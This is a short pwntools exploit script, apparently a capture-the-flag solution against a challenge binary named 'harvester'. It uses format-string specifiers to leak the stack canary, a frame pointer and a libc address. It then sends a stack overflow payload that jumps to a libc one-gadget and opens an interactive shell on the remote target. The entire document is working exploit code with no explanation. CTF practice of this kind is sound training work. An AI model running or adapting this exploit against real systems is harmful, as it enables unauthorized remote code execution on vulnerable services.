from pwn import *

# r = process(["./harvester"])
r = remote(...)

r.sendlineafter("> ", "1")
r.sendlineafter("> ", "%11$p")
canary = r.sendlineafter("> ", "1").decode().split("0x")[1].split("\x1b")[0]
canary = int(canary, 16)
log.info("Canary: 0x%x" % canary)

r.sendlineafter("> ", "%10$p")
fs = r.sendlineafter("> ", "1").decode().split("0x")[1].split("\x1b")[0]
fs = int(fs, 16)
log.info("fs: 0x%x" % fs)

r.sendlineafter("> ", "%21$p")
leak = r.sendlineafter("> ", "2").decode().split("0x")[1].split("\x1b")[0]
leak = int(leak, 16)
leak -= 0x021bf7
log.info("Libc @ 0x%x" % leak)

r.sendlineafter("> ", "y")
r.sendlineafter("> ", "-11")

r.sendlineafter("> ", "3")
payload = b"a" * 0x20 + p64(fs) + p64(canary) + p64(0xdeadbeefdeadbeef)
payload += p64(leak + 0x4f3d5)
r.sendlineafter("> ", payload)

r.interactive()
